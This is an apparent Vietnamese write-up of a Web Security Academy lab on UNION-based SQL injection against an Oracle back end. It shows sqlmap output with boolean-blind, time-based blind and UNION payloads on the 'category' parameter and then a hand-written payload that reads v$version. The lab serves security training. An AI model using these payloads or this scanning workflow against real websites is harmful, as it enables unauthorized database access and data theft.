> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
> 
> To solve the lab, display the database version string.

Ở bài này nhiệm vụ của ta là cần tìm lỗ hỏng SQL và sau đó có thể khiến cho nội dung in ra màn hình là phiên bản của database. Sau khi đã thành thạo được các thao tác tiếp cận từ các lab trước để tăng tốc độ công việc trong lab này chúng ta sẽ tập sử dụng tool tự động phát hiện và tìm hiểu cách đọc báo kết quả của nó. Tool được mình sử dụng để tìm kiếm tự động lỗ hỏng bảo mật đó sẽ là sqlmap.

Bây giờ chúng ta sẽ tiến hành quét tự động để tìm ra vị trí có thể có lỗ hỏng.

![](images/Pasted%20image%2020261106213441.png)

![](images/Pasted%20image%2020261106213503.png)

![](images/Pasted%20image%2020261106213524.png)

Sau khi tự động quét xong chúng ta nhận được các kết quả vô cùng có ích cho việc tấn công vào mục tiêu của mình. Bây giờ chúng ta sẽ phân tích từng kết quả có lợi được trả về và xác định đúng vị trí và hướng tiếp cận mà mình sẽ làm tiếp theo.

Đầu tiên sau khi crawl để tìm tất cả url thì sqlmap đã tìm được 1 url khả dĩ có khả năng bị chèn SQL là:

```bash
[1/1] URL:
GET https://0ad40080036331328092086700b500b2.web-security-academy.net/filter?category=Accessories
```

Và chúng tiến hành testing với url này để xác định có lỗ hỏng bảo mật hay không.

```bash
[09:08:08] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Oracle' 
it looks like the back-end DBMS is 'Oracle'.
```

Trong quá trình quét thì sqlmap đã xác định được DBMS là Oracle và chúng sẽ tiến hành sinh các payload đặc trưng cho database này.

```bash
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=Accessories' AND 8147=8147 AND 'rnXB'='rnXB

    Type: time-based blind
    Title: Oracle AND time-based blind (heavy query)
    Payload: category=Accessories' AND 2072=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'GJUo'='GJUo

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: category=Accessories' UNION ALL SELECT NULL,CHR(113)||CHR(107)||CHR(98)||CHR(120)||CHR(113)||CHR(76)||CHR(107)||CHR(103)||CHR(74)||CHR(114)||CHR(103)||CHR(120)||CHR(118)||CHR(97)||CHR(116)||CHR(120)||CHR(122)||CHR(103)||CHR(67)||CHR(66)||CHR(116)||CHR(90)||CHR(71)||CHR(112)||CHR(116)||CHR(79)||CHR(107)||CHR(114)||CHR(111)||CHR(117)||CHR(106)||CHR(109)||CHR(105)||CHR(119)||CHR(66)||CHR(103)||CHR(100)||CHR(114)||CHR(114)||CHR(117)||CHR(76)||CHR(82)||CHR(118)||CHR(83)||CHR(113)||CHR(113)||CHR(122)||CHR(107)||CHR(118)||CHR(113) FROM DUAL-- UQFW

```

Trong kết quả cuối cùng mà sqlmap trả về sau khi hoàn tất quét chúng ta có được vô cùng nhiều điều hữu ích từ report này. Đầu tiên là về việc có lỗ hỏng về **boolean-based blind** và ở lỗ hỏng thứ 2 được báo cáo là có thể xảy ra tình trạng **time-based blind** nghĩa là có thể xác định được tính đúng sai dựa trên thời gian trả lời truy vấn do truy vấn đúng sẽ trả lời sau khoảng thời gian rất lâu và ngược lại là rất nhanh với điều kiện sai, nhưng ở bài của chúng ta thì không thể triển khai được lỗ hỏng loại này. Nhưng cái key mà chúng ta cần tìm kiếm lại nằm ở báo cáo lỗi thứ 3 là việc truy vấn có thể bị chèn UNION với loại lỗi là **UNION query** đặc biệt ta còn xác định được luôn số cột rồi. Thế nên bây giờ việc của mình là sẽ sửa truy vấn UNION lại thành truy vấn để xuất ra phiên bản của DBMS. Ở đây mình có thể sinh được truy vấn như sau:

```sql
https://0ad40080036331328092086700b500b2.web-security-academy.net/filter?category=' UNION SELECT BANNER, NULL FROM v$version--
```

![](images/Pasted%20image%2020261106214737.png)

Vậy là ta đã có thể xuất được phiên bản của DBMS bằng cách tối ưu tốc độ tiếp cận bài bằng tool tự động và làm quen với cách đọc báo cáo lỗi trả về từ sqlmap cũng như tự tay viết payload để tấn công vào đúng vị trí lỗ hỏng đã được xác định.
